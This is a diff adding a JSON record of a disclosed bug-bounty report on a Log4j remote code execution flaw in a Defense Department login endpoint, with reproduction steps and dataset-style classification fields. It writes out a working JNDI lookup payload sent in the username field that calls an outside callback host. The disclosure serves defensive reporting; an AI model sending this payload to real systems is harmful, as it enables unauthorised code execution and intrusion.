@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "hachimanxienim ",
+  "title": "\u2588\u2588\u2588\u2588\u2588\u2588_log4j - https://\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nHi security team, i found a log4j vulnerability in your aplication\nImpact\nLogging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nSend POST request to this endpoint ---> https://\u2588\u2588\u2588\u2588\u2588\u2588/mifs/j_spring_security_check\nthe post request:\nj_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee\nSuggested Mitigation/Remediation Actions\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1662505620,
+  "report_url": "https://hackerone.com/reports/1631364",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to the endpoint: https://\u2588\u2588\u2588\u2588\u2588\u2588/mifs/j_spring_security_check"
+    ],
+    [
+      2,
+      "Use the following payload in the request: j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Log4j Remote Code Execution (RCE) vulnerability, where logging untrusted or user-controlled data with a vulnerable version of Log4J can lead to RCE. This includes data from logged errors, authentication failures, and other unexpected vectors of user-controlled input.",
+  "reason": "The attack involves a straightforward exploitation of a known vulnerability (Log4j) with a simple payload. It does not require multiple components, complex interactions, or novel logic. The steps are well-documented and widely known in the security community.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The log4j vulnerability involves Remote Code Execution (RCE) through logging untrusted data, which is not directly related to authentication or authorization bypasses (AuthN/AuthZ) or Insecure Direct Object References (IDOR). The methodologies described focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which does not apply to the log4j vulnerability.",
+    "is_detectable": false
+  }
+}
